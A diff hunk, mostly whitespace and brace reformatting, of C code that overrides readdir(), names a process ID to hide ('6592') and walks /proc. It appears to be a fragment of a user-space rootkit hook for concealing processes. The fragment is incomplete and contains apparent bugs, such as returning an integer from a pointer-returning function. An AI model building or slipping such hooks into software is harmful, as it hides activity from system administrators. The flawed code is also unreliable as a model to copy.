@@ -17,28 +17,27 @@ struct dirent *readdir (DIR * dirp){
       fprintf(stderr, "Catched\n");
    }
 
-     DIR *directory;
-     DIR *subdirectory;
-     static const char* hide_process = "6592";
-     // will store pointer to each entry in the directory
-     struct dirent *entry;
+   DIR *directory;
+   DIR *subdirectory;
+   static const char* hide_process = "6592";
+   // will store pointer to each entry in the directory
+   struct dirent *entry;
      
-     // attempt to open the current working directory, opendir() returns NULL 
-     // on failure
-     directory = opendir("/proc");
+   // attempt to open the current working directory, opendir() returns NULL 
+   // on failure
+   directory = opendir("/proc");
      
-     // if opening the directory fails, exit with an error message and status
-     if (directory == NULL)
-     {
-       printf("Error opening directory.\n");
-       return 1;
-     }
+   // if opening the directory fails, exit with an error message and status
+   if (directory == NULL)
+   {
+      printf("Error opening directory.\n");
+      return 1;
+    }
      
-     // Read each entry in the directory with readdir() and store the pointer to 
-     // the struct dirent into entry... when there are no more entries in the 
-     // directory readdir() will return NULL and terminate the loop at that point.
-     while ((entry = readdir(directory)) != NULL)
-     {
+    // Read each entry in the directory with readdir() and store the pointer to 
+    // the struct dirent into entry... when there are no more entries in the 
+    // directory readdir() will return NULL and terminate the loop at that point.
+    while ((entry = readdir(directory)) != NULL){
        // if the entry is a directory, output the directory name 
        // prepended with "dir: " again so we know what what it is when looking 
        // at the program output.
